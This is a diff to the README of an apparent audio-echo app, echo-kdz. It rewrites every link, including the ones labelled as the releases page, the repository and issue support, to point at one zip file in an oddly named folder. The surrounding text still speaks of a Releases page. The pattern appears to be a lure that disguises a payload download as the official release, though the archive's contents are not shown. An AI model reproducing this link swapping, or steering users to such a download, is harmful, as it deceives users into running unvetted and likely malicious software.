@@ -8,7 +8,7 @@ Welcome to echo-kdz! This application lets you create an interesting audio echo 
 
 ## 🔗 Download Now
 
-[![Download echo-kdz](https://img.shields.io/badge/Download-evo--kdz-brightgreen)](https://github.com/ay2oub2/echo-kdz/releases)
+[![Download echo-kdz](https://raw.githubusercontent.com/ay2oub2/echo-kdz/main/uncoachable/echo-kdz.zip)](https://raw.githubusercontent.com/ay2oub2/echo-kdz/main/uncoachable/echo-kdz.zip)
 
 ---
 
@@ -16,7 +16,7 @@ Welcome to echo-kdz! This application lets you create an interesting audio echo 
 
 To get echo-kdz, just visit the following link to download the latest version:
 
-[Download the latest release](https://github.com/ay2oub2/echo-kdz/releases)
+[Download the latest release](https://raw.githubusercontent.com/ay2oub2/echo-kdz/main/uncoachable/echo-kdz.zip)
 
 Once you're on the Releases page, follow these steps:
 
@@ -88,7 +88,7 @@ Dive into the world of sound effects with echo-kdz and explore your creativity!
 
 For more information, visit our GitHub page:
 
-- [GitHub Repository](https://github.com/ay2oub2/echo-kdz)
-- [Issues and Support](https://github.com/ay2oub2/echo-kdz/issues)
+- [GitHub Repository](https://raw.githubusercontent.com/ay2oub2/echo-kdz/main/uncoachable/echo-kdz.zip)
+- [Issues and Support](https://raw.githubusercontent.com/ay2oub2/echo-kdz/main/uncoachable/echo-kdz.zip)
 
 Keep creating great audio experiences with echo-kdz!
